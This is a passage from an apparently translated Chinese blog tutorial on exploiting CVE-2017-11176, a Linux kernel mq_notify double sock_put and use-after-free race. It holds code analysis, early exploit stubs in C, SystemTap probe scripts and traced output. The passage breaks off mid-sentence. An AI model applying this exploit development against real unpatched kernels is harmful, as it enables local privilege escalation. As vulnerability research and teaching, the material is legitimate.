<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>netlink_attachskb()</code>有两条路径：</p>
<ol>
<li>正常路径：<code>skb</code>拥有权转到<code>sock</code>（例如加入到sock的接收队列中）</li>
<li>Socket的接收缓冲区已满：等待直到有足够的空间并重试，或退出</li>
</ol>
<p>如注释所言：调用者必须持有对目标套接字的引用(?)。 出错时，<code>refcounter</code>会被减1，因此<code>netlink_attachskb</code>对<code>sock</code>的<code>refcounter</code>有副作用。</p>
<p>既然<code>netlink_attachskb</code>可能释放<code>refcounter</code>，调用者应该确保它不能被释放第二次，这个由将<code>sock</code>设置为NULL实现。在错误路径中<code>sock</code>被正确处理了，但在<code>retry</code>中并没有。</p>
<p>至此，我们知道了错误发生的情况，即<code>retry</code>逻辑中没有正确重置<code>sock</code>为NULL。</p>
<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>Patch中提到了与已经关闭的<code>fd</code>相关的条件竞争窗口，首先来看下<code>retry</code>逻辑的起始位置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sock = <span class="literal">NULL</span>;  <span class="comment">// &lt;----- first loop only</span></span><br><span class="line">retry:</span><br><span class="line">      filp = fget(notification.sigev_signo);</span><br><span class="line">      <span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">        ret = -EBADF;</span><br><span class="line">        <span class="keyword">goto</span> out;         <span class="comment">// &lt;----- what about this?</span></span><br><span class="line">      &#125;</span><br><span class="line">      sock = netlink_getsockbyfilp(filp);</span><br></pre></td></tr></table></figure>

<p>在第一次循环的时候，错误处理路径看起来似乎是无害的，但是要记住，在第二次循环的时候（goto retry之后），<code>sock</code>已经不是NULL了，并且<code>refcounter</code>已经被减1。所以，直接跳到<code>out</code>，满足了第一个条件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">out:</span><br><span class="line">  <span class="keyword">if</span> (sock) &#123;</span><br><span class="line">    netlink_detachskb(sock, nc);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>sock</code>在这被减1了第二次（<strong>double sock_put() bug</strong>）。可能会疑惑为什么会在第二次循环中触发这个条件（<code>fgets</code>返回NULL），这就是这个漏洞的条件竞争部分，会在下一章说明。</p>
<h4 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h4><p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true" alt="流程图"></p>
<p><code>close</code>系统调用触发<code>fputs()</code>（对<code>refcounter</code>减1）并从映射表中将fd和文件的映射移除，将<code>fdt[TARGET_FD]</code>的入口设置为NULL。因为调用<code>close(fd)</code>函数将会释放最后一个对文件的引用，所以<code>file</code>结构体将会被释放。由于<code>file</code>结构体被释放，相关联的<code>sock</code>的结构体的引用计数被减1，且<code>sock</code>的计数为0，导致它被释放。这时，<code>sock</code>指针并没有被设置为NULL，使其成为了一个野指针。</p>
<p>因为fd已经不指向任何有效的文件结构了，所以第二次调用<code>fget()</code>时会失败，程序将会跳转到<code>out</code>标签处。接着<code>netlink_detachskb()</code>将会使用之前已经被释放的<code>sock</code>指针，导致<em>use after free</em>。这里的<em>use after free</em>是漏洞导致的结果而不是漏洞产生的原因。</p>
<p>这就是为什么patch提到了关闭fd，这是触发漏洞的必要条件。并且因为<code>close()</code>发生在其它线程中的特定时间，所以产生了竞争条件。</p>
<p>到此为止，我们知道了关于漏洞的所有知识以及如何触发它，需要明确两个条件：</p>
<ol>
<li>在第一个<code>retry</code>中，<code>netlink_attachskb()</code>应该返回1</li>
<li>在第二个<code>retry</code>中，<code>fget()</code>应该返回NULL</li>
</ol>
<p>换句话说，当我们从<code>mq_notify()</code>系统调用返回时，<code>sock</code>的<code>refcounter</code>已经被减去了1，这里出现了失衡。因为<code>refcounter</code>在进入系统调用之前是1，当它释放后，在<code>netlink_detachskb()</code>中又被使用。</p>
<h3 id="0x04-如何到达retry逻辑"><a href="#0x04-如何到达retry逻辑" class="headerlink" title="0x04  如何到达retry逻辑"></a>0x04  如何到达retry逻辑</h3><p>在之前的章节中，我们分析了漏洞及其触发的条件，在这个章节，我们将会探究如何到达漏洞代码处并编写exp。事实上，确认bug是否能被利用是第一要务，如果无法到达相应的代码处，也就没有继续研究的必要了。</p>
<h4 id="分析retry之前的代码"><a href="#分析retry之前的代码" class="headerlink" title="分析retry之前的代码"></a>分析retry之前的代码</h4><p>如同大多数系统调用一样，<code>mq_notift</code>一开始也调用<code>copy_from_user()</code>函数从用户态读取数据：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    SYSCALL_DEFINE2(mq_notify, <span class="keyword">mqd_t</span>, mqdes,</span><br><span class="line">        <span class="keyword">const</span> struct sigevent __user *, u_notification)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> ret;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">notification</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">nc</span>;</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (u_notification) &#123;</span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> (copy_from_user(&amp;notification, u_notification,</span><br><span class="line">              <span class="keyword">sizeof</span>(struct sigevent)))</span><br><span class="line">          <span class="keyword">return</span> -EFAULT;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      audit_mq_notify(mqdes, u_notification ? &amp;notification : <span class="literal">NULL</span>);  <span class="comment">// &lt;--- you can ignore this</span></span><br></pre></td></tr></table></figure>

<p>代码在[0]处检查<code>u_notification</code>是否被设置为NULL，在[1]处从用户态拷贝数据到<code>notification</code>。接下来，可以看到一系列基于用户态数据中的sigevent结构体的检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      nc = <span class="literal">NULL</span>;</span><br><span class="line">      sock = <span class="literal">NULL</span>;</span><br><span class="line">[<span class="number">2</span>]   <span class="keyword">if</span> (u_notification != <span class="literal">NULL</span>) &#123;</span><br><span class="line">[<span class="number">3</span>a]     <span class="keyword">if</span> (unlikely(notification.sigev_notify != SIGEV_NONE &amp;&amp;</span><br><span class="line">               notification.sigev_notify != SIGEV_SIGNAL &amp;&amp;</span><br><span class="line">               notification.sigev_notify != SIGEV_THREAD))</span><br><span class="line">          <span class="keyword">return</span> -EINVAL;</span><br><span class="line">[<span class="number">3b</span>]    <span class="keyword">if</span> (notification.sigev_notify == SIGEV_SIGNAL &amp;&amp;</span><br><span class="line">          !valid_signal(notification.sigev_signo)) &#123;</span><br><span class="line">          <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">[<span class="number">3</span>c]    <span class="keyword">if</span> (notification.sigev_notify == SIGEV_THREAD) &#123;</span><br><span class="line">          <span class="keyword">long</span> timeo;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* create the notify skb */</span></span><br><span class="line">          nc = alloc_skb(NOTIFY_COOKIE_LEN, GFP_KERNEL);</span><br><span class="line">          <span class="keyword">if</span> (!nc) &#123;</span><br><span class="line">            ret = -ENOMEM;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line">[<span class="number">4</span>]       <span class="keyword">if</span> (copy_from_user(nc-&gt;data,</span><br><span class="line">              notification.sigev_value.sival_ptr,</span><br><span class="line">              NOTIFY_COOKIE_LEN)) &#123;</span><br><span class="line">            ret = -EFAULT;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* <span class="doctag">TODO:</span> add a header? */</span></span><br><span class="line">          skb_put(nc, NOTIFY_COOKIE_LEN);</span><br><span class="line">          <span class="comment">/* and attach it to the socket */</span></span><br><span class="line"></span><br><span class="line">    retry:                                    <span class="comment">// &lt;---- we want to reach this!</span></span><br><span class="line">            filp = fget(notification.sigev_signo);</span><br></pre></td></tr></table></figure>

<p>如果[2]处非NULL，<code>sigev_notify</code>的值会在[3a] [3b] [3c]检查三遍。另一次<code>copy_from_user()</code>在[4]处根据<code>notification.sigev_value_sival_ptr</code>的值触发，需要指向一个用户空间中有效的、可读取的区域的指针，否则函数调用会失败。</p>
<p><code>sigevent</code>声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/asm-generic/siginfo.h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> sigval &#123;</span><br><span class="line">  <span class="keyword">int</span> sival_int;</span><br><span class="line">  <span class="keyword">void</span> __user *sival_ptr;</span><br><span class="line">&#125; <span class="keyword">sigval_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> &#123;</span></span><br><span class="line">  <span class="keyword">sigval_t</span> sigev_value;</span><br><span class="line">  <span class="keyword">int</span> sigev_signo;</span><br><span class="line">  <span class="keyword">int</span> sigev_notify;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> _pad[SIGEV_PAD_SIZE];</span><br><span class="line">     <span class="keyword">int</span> _tid;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      <span class="keyword">void</span> (*_function)(<span class="keyword">sigval_t</span>);</span><br><span class="line">      <span class="keyword">void</span> *_attribute; <span class="comment">/* really pthread_attr_t */</span></span><br><span class="line">    &#125; _sigev_thread;</span><br><span class="line">  &#125; _sigev_un;</span><br><span class="line">&#125; <span class="keyword">sigevent_t</span>;</span><br></pre></td></tr></table></figure>

<p>为了进入<code>retry</code>至少一次，我们需要：</p>
<ol>
<li>提供一个非空的<code>u_notification</code>参数</li>
<li>将<code>u_notification.sigev_notify</code>设置为<code>SIGEV_THREAD</code></li>
<li><code>notification.sigev_value.sival_ptr</code>必须是一个合法的用户空间可读指针，数据长度至少32字节(NOTIFY_COOKIE_LEN=32)。</li>
</ol>
<h4 id="开始编写exploitation"><a href="#开始编写exploitation" class="headerlink" title="开始编写exploitation"></a>开始编写exploitation</h4><p>先编写一个exp验证<code>mq_notify</code>可用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2017-11176 Exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">  <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-=&#123; CVE-2017-11176 Exploit &#125;=-\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the sigevent structure</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line">  sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">  sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mqnotify&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mqnotify succeed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> exploit</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;exploit failed!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>推荐使用Makefile来降低exp的开发难度。为了编译这段代码，需要使用<code>-lrt</code>标志（调用<code>mq_notify</code>所必需的）。另外，推荐使用<code>-O0</code>优化选项避免gcc重排我们的代码导致不可预料的问题。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-=&#123; CVE-2017-11176 Exploit &#125;=-</span><br><span class="line">mqnotify: Bad file descriptor</span><br><span class="line">exploit failed!</span><br></pre></td></tr></table></figure>

<p><code>mq_notify</code>返回了<code>Bad file descriptor</code>（-EBADF），有三个地方会导致该错误：</p>
<ol>
<li>fget()的某次调用</li>
<li>filp-&gt;f_op != &amp;mqueue_file_operations的检查</li>
</ol>
<p>让我们找出具体是什么位置。</p>
<h4 id="System-Tap"><a href="#System-Tap" class="headerlink" title="System Tap"></a>System Tap</h4><p>在exp开发的初始阶段，强烈建议在带调试符号的kernel中运行exp，这将使得我们可以使用<strong>SystemTap</strong>。SystemTap是一个内核探针工具，并且不需要使用gdb。</p>
<p>让我们从一个基本的System Tap脚本开始：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># mq_notify.stp</span><br><span class="line"></span><br><span class="line">probe syscall.mq_notify</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n(%d-%d) &gt;&gt;&gt; mq_notify (%s)\n&quot;</span>, pid(), tid(), argstr)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe syscall.mq_notify.<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) &lt;&lt;&lt; mq_notify = %x\n\n\n&quot;</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前述脚本安装的两个探针分别位于系统调用之前和之后，使用<code>execname()</code>来限制输出的条件。</p>
<p>备注：如果输出太多，SystemTap会忽略一些输出并且不会提示。</p>
<p>运行脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stap -v mq_notify.stp</span><br></pre></td></tr></table></figure>

<p>再次运行exp将会显示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(14427-14427) &gt;&gt;&gt; mq_notify (-1, 0x7ffdd7421400)</span><br><span class="line">(14427-14427) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p>探针正常工作，-1是我们设置的第一个参数，第二个参数是一个用户态指针，返回值-9即-EBADF。接下来添加新的输出，不同于syscall的hook，一般的内核函数可以通过下列写法来实现hook：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">probe kernel.function (<span class="string">&quot;fget&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) [vfs] ==&gt;&gt; fget (%s)\n&quot;</span>, pid(), tid(), $$parms)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>备注：由于某些原因，并不是所有内核函数都可以被hook。例如一些内联函数，需要根据其具体的位置判断其是否能被hook。另外，像<code>copy_from_user()</code>这种函数，可以在调用前被hook，调用后不能被hook。SystemTap会提示和拒绝这些hook。</p>
<p>接着我们对<code>mq_notify()</code>中的每一个函数都添加了探针并重新运行exp：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(17850-17850) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffc30916f50)</span><br><span class="line">(17850-17850) [uland] ==&gt;&gt; copy_from_user ()</span><br><span class="line">(17850-17850) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)</span><br><span class="line">(17850-17850) [uland] ==&gt;&gt; copy_from_user ()</span><br><span class="line">(17850-17850) [skb] ==&gt;&gt; skb_put (skb=0xffff88002e061200 len=0x20)</span><br><span class="line">(17850-17850) [skb] &lt;&lt;== skb_put = ffff88000a187600</span><br><span class="line">(17850-17850) [vfs] ==&gt;&gt; fget (fd=0x3)</span><br><span class="line">(17850-17850) [vfs] &lt;&lt;== fget = ffff88002e271280</span><br><span class="line">(17850-17850) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88002e271280)</span><br><span class="line">(17850-17850) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88002ff82800</span><br><span class="line">(17850-17850) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)</span><br><span class="line">(17850-17850) [netlink] &lt;&lt;== netlink_attachskb = 0</span><br><span class="line">(17850-17850) [vfs] ==&gt;&gt; fget (fd=0xffffffff)</span><br><span class="line">(17850-17850) [vfs] &lt;&lt;== fget = 0</span><br><span class="line">(17850-17850) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)</span><br><span class="line">(17850-17850) [netlink] &lt;&lt;== netlink_detachskb</span><br><span class="line">(17850-17850) [SYSCALL] &lt;&lt;== mq_notify= -9</span><br></pre></td></tr></table></figure>

<h4 id="First-Bug"><a href="#First-Bug" class="headerlink" title="First Bug"></a>First Bug</h4><p>本地测试的输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Pass 1: parsed user script and 106 library script(s) using 87868virt/32748res/5356shr/28164data kb, in 90usr/0sys/92real ms.</span><br><span class="line">Pass 2: analyzed script: 593 probe(s), 12 function(s), 5 embed(s), 0 global(s) using 147776virt/93816res/6848shr/88072data kb, in 830usr/60sys/896real ms.</span><br><span class="line">Pass 3: using cached /root/.systemtap/cache/c1/stap_c16be11687935a62b4012a183645f89c_205765.c</span><br><span class="line">Pass 4: using cached /root/.systemtap/cache/c1/stap_c16be11687935a62b4012a183645f89c_205765.ko</span><br><span class="line">Pass 5: starting run.</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(2521-2521) &gt;&gt;&gt; mq_notify (-1, 0x7fffd32050e0)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003c4ff100)</span><br><span class="line">(2521-2521) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003c7b2000</span><br><span class="line">(2521-2521) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003c7b2000 skb=0xffff88003afd0100 timeo=0xffff88003c6c3f08 ssk=0x0)</span><br><span class="line">(2521-2521) &lt;&lt;&lt; netlink_attachskb = 0</span><br><span class="line">(2521-2521) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003c7b2000 skb=0xffff88003afd0100)</span><br><span class="line">(2521-2521) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(2521-2521) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br></pre></td></tr></table></figure>

<p>看起来我们似乎到达了<code>retry</code>逻辑：</p>
<ol>
<li>copy_from_user调用</li>
<li>alloc_skb调用：exp传递了SIGEV_THREAD</li>
<li>copy_from_user调用：获取sival_buffer</li>
<li>skb_put调用：表明了第三步没有失败</li>
<li>fdget(fd=?)：在作者原文中，fd=0x3</li>
</ol>
<p>作者原文中提到，fd应该为0，因为notification.sigev_signo没有传递其它值。尽管如此，第一个<code>fget()</code>并没有失败，另外<code>netlink_getsockbyfilp()</code>和<code>netlink_attachskb()</code>也正常工作。这些事有些奇怪因为我们并没有创建任何AF_NETLINK socket。</p>
<p>第二个<code>fget()</code>失败是因为我们通过<code>mq_notify</code>的参数设置了fd为-1，问题在哪？让我们回过头检查一下<code>sigevent</code>指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sigev = 0x%p\n&quot;</span>, &amp;sigev);</span><br><span class="line"><span class="keyword">if</span> (mq_notify((<span class="keyword">mqd_t</span>) <span class="number">-1</span>, &amp;sigev))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sigev = 0x0x7fffbca93010</span><br><span class="line">(2566-2566) &gt;&gt;&gt; mq_notify (-1, 0x7fffbca92f90)</span><br></pre></td></tr></table></figure>

<p>显然系统调用所接收到的指针(0x7fffbca92f90)和我们所提供的(0x0x7fffbca93010)并不完全相同，这可能因为SystemTap有bug或者库的wrapper。</p>
<p>修改exp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">	<span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;CVE-2017-11176 Exploit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sigev = 0x%p\n&quot;</span>, &amp;sigev);</span><br><span class="line">	<span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line"></span><br><span class="line">	sigev.sigev_signo = <span class="number">-1</span>;</span><br><span class="line">	sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">	sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;mqnotify&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;mqnotify succeed\n&quot;</span>);</span><br><span class="line">	<span class="comment">// TODO</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Exploit Failed\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为直接使用了系统调用，编译时不需要再使用-lrt选项了。新的结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sigev = 0x0x7fffe677a630</span><br><span class="line">(2599-2599) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffe677a630)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(3198-3198) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffeda9b070)</span><br><span class="line">(3198-3198) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3198-3198) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3198-3198) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3198-3198) &gt;&gt;&gt; skb_put (skb=0xffff88003af5d200 len=0x20)</span><br><span class="line">(3198-3198) &lt;&lt;&lt; skb_put = ffff88003aec5000</span><br><span class="line">(3198-3198) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(3198-3198) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p>当第一次<code>fget()</code>失败后，程序如我们所期望的直接走到了<code>out</code>标签。到此为止，我们知道了我们可以绕过安全检查到达<code>retry</code>标签。</p>
<p>A common trap has been exposed (caused by library wrapper(封装) instead of syscall), and we saw how to fix it. In order to avoid the same kind of bug in the future, we will wrap every syscall.</p>
<h3 id="0x05-强制触发"><a href="#0x05-强制触发" class="headerlink" title="0x05 强制触发"></a>0x05 强制触发</h3><p>有些时候你想验证一个想法又不想从头先搞明白相关的所有代码，在这种情况下，可以使用<em>System Tap Guru Mode</em>来修改内核的数据结构来强制内核执行特定的路径。换句话说，我们可以在内核态去触发漏洞，如果我们在内核态都无法触发漏洞，就更不用说从用户态去触发了。所以，先分析如何修改内核相关参数来满足漏洞触发条件，再逐步去实现用户态的exp(Part 2)。</p>
<p>我们可以触发漏洞如果：</p>
<ol>
<li>到达<code>retry</code>逻辑（循环回<code>retry</code>）。我们需要进入<code>netlink_attachskb()</code>并返回1，<code>sock</code>的计数器会减去1。</li>
<li>当返回<code>retry</code>时，下一次<code>fget()</code>必须返回空以进入<code>out</code>路径并使得<code>sock</code>的计数器再减1。</li>
</ol>
<h4 id="到达netlink-attachskb"><a href="#到达netlink-attachskb" class="headerlink" title="到达netlink_attachskb()"></a>到达netlink_attachskb()</h4><p>在前述中，为了触发漏洞，我们必须让<code>netlink_attachskb()</code>返回1，在调用它之前，我们还需先满足几个条件：</p>
<ol>
<li>提供一个有效的fd避免第一次<code>fget()</code>执行失败</li>
<li>fd指向的文件必须是AF_NETLINK类型的sock</li>
</ol>
<p>这样就可以通过检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    retry:</span><br><span class="line">[<span class="number">0</span>]       filp = fget(notification.sigev_signo);</span><br><span class="line">          <span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">            ret = -EBADF;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line">[<span class="number">1</span>]       sock = netlink_getsockbyfilp(filp);</span><br><span class="line">          fput(filp);</span><br><span class="line">          <span class="keyword">if</span> (IS_ERR(sock)) &#123;</span><br><span class="line">            ret = PTR_ERR(sock);</span><br><span class="line">            sock = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>通过[0]处的第一个检查比较简单，提供了有效的fd即可，但最好还是提供一个合适的fd，否则[1]处的检查可能会失败：</p>
